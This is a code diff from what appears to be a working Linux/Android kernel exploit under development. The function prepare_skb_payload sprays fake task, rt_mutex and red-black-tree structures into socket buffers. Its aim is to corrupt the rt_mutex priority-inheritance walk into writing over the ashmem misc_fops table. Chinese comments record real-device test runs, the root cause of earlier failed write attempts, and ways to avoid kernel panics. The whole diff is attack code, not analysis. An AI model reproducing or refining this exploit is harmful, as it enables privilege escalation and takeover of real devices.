@@ -494,62 +494,53 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
   fake_task = payload_base + FAKE_TASK_OFF;
   fake_fops = payload_base + FOPS_TABLE_OFF;
   if (payload_mode == PAGE_PAYLOAD_FOPS) {
-    fake_parent = fake_fops;
-    fake_right = data_addr(ASHMEM_MISC_FOPS);
-    fake_left = 0;
     binwrite_target = payload_base + SCRATCH_OFF;
   } else {
-    fake_parent = data_addr(ASHMEM_MISC_FOPS) - 8;
-    fake_right = fake_fops;
-    fake_left = payload_base + LEFT_OFF;
     binwrite_target = payload_base + FOPS_OFF + 0x700;
   }
 
-  uintptr_t write_pc = fake_fops;
-  uintptr_t write_right = data_addr(ASHMEM_MISC_FOPS);
+  /* 【页内种子按模式分家】
+   * SLIDE(早退探测路线): owner=NULL 让 walk 在 "lock free" 分支提前
+   *   wake+退出 —— 零解引用, 真机验证 DEPTH0 就是靠它活着。
+   * FOPS(W1 写路线): 必须 owner=fake_task|1 —— owner==NULL 会让
+   *   rt_mutex_adjust_prio_chain 走 "lock is free" 早退分支, rb_erase
+   *   永远不执行, W1 写不到 misc_fops(真机 23 次全 step=4 的根因)。
+   *   深入所需种子对齐 Poc-Analysis 真机验证版: fake_task.pi_waiters
+   *   空树、task_group=0、页内 w0.pi_tree_entry 也带 W1 语义。 */
+  uintptr_t fake_right_zone = payload_base + RIGHT_OFF;
+  uintptr_t fake_left_zone = payload_base + LEFT_OFF;
+  uintptr_t write_pc = fake_right_zone;
+  uintptr_t write_right = 0;
   uintptr_t write_left = 0;
-  uint64_t waiter_task = text_addr(INIT_TASK);
-  uint64_t task_group = text_addr(ROOT_TASK_GROUP);
-  uint64_t pi_top_task = text_addr(INIT_TASK);
-  if (payload_mode == PAGE_PAYLOAD_SLIDE) {
-    /* 【第 1 关专用: 全图页内自包含】运行时线性映射基址是随机化的
-     * (真书包地址 0xffffff88xxxxxxxx，编译期常量却假设 0xffffff80xxx)，
-     * 任何编译期算出的 SLIDE_* 地址在运行时都是"查无此房"，一碰就全园
-     * 警报(panic)。所以这里把整张假排班表的指针全部改指书包内部：
-     * 假 task 指书包里的假 task，假锁指书包里的假锁，邻居也是书包内。 */
-    uintptr_t fake_right_zone = payload_base + RIGHT_OFF;
-    uintptr_t fake_left_zone = payload_base + LEFT_OFF;
-    write_pc = fake_right_zone;
-    write_right = 0;
-    write_left = 0;
-    waiter_task = fake_task;
-    task_group = fake_task;
-    pi_top_task = fake_task;
-    fake_parent = fake_right_zone;
-    fake_right = fake_left_zone;
+  uint64_t waiter_task = fake_task;
+  uint64_t task_group = fake_task;
+  uint64_t pi_top_task = fake_task;
+  int deep_walk = payload_mode == PAGE_PAYLOAD_FOPS;
+  if (deep_walk) {
+    write_pc = fake_fops;
+    write_left = canon_addr(ASHMEM_MISC_FOPS);
+    task_group = 0;
   }
+  fake_parent = fake_right_zone;
+  fake_right = fake_left_zone;
+  fake_left = fake_left_zone;
 
   for (size_t chunk = 0; chunk < SKB_SEND_SIZE; chunk += ORDER3_SIZE) {
     unsigned char *p = skb_buf + chunk + SKB_FRAG_BIAS;
 
     /* 【假锁的排队名单】waiters 红黑树指到书包里的 fake_w0。园长查
      * "谁在排队"时(leftmost->task)，第一个读的就是这里 —— 必须落在
-     * 书包内，否则空指针警报(反汇编已验证无 NULL 检查)。 */
+     * 书包内，否则空指针警报(反汇编已验证无 NULL 检查)。
+     * owner: SLIDE=NULL(walk 早退零解引用); FOPS=fake_task|1 ——
+     * owner==NULL 走 "lock is free" 分支直接 wake 退出, rb_erase/W1
+     * 不执行(真机 step=4 根因); owner 非 NULL 且 != walk task 才会
+     * 继续 dequeue/enqueue 链。fake_task 全部 seeds 页内自包含
+     * (pi_blocked_on=0 终止链, __state=0 早退 wake, usage=0x100),
+     * 深入不会出页。 */
     put32(p, LOCK_OFF + 0x00, 0);
-    if (payload_mode == PAGE_PAYLOAD_SLIDE) {
-      /* owner==NULL branch of rt_mutex_adjust_prio_chain does
-       * wake_up_state(lock->waiters.rb_leftmost->task, ...) without a
-       * leftmost NULL check (verified by disasm @ adjust_prio_chain+0x820:
-       * cbz x8 skips only the lock-check, then ldr x0,[x8,#0x30] panics).
-       * Point waiters tree at fake_w0 so leftmost derefs stay in our page. */
-      put64(p, LOCK_OFF + 0x08, fake_w0);
-      put64(p, LOCK_OFF + 0x10, fake_w0);
-      put64(p, LOCK_OFF + 0x18, 0);
-    } else {
-      put64(p, LOCK_OFF + 0x08, fake_w0);
-      put64(p, LOCK_OFF + 0x10, fake_w0);
-      put64(p, LOCK_OFF + 0x18, fake_task | 1);
-    }
+    put64(p, LOCK_OFF + 0x08, fake_w0);
+    put64(p, LOCK_OFF + 0x10, fake_w0);
+    put64(p, LOCK_OFF + 0x18, deep_walk ? (fake_task | 1) : 0);
 
     /* 【假标签树根必须染黑】parent_color=0 表示"无父 + 黑色"。
      * 树根若是红色：园长把红色鬼标签补挂到它下面时会触发"红红冲突"，
@@ -574,7 +565,11 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
     put32(p, FAKE_TASK_OFF + FAKE_TASK_PRIO_OFF, FAKE_TASK_PRIO);
     put32(p, FAKE_TASK_OFF + FAKE_TASK_NORMAL_PRIO_OFF, FAKE_TASK_PRIO);
     put32(p, FAKE_TASK_OFF + FAKE_TASK_PI_LOCK_OFF, 0);
-    if (payload_mode == PAGE_PAYLOAD_FOPS) {
+    if (deep_walk) {
+      /* FOPS: pi_waiters 空树(Poc 真机验证版) —— dequeue_pi 的
+       * rb_erase_cached 在空树上只操作鬼标签自身字段(树根写 NULL,
+       * 页外零写), enqueue_pi 成根零旋转; 非空树反而会被 walk 深入
+       * 逐节点核对。 */
       put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF, 0);
       put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 0x08, 0);
     } else {
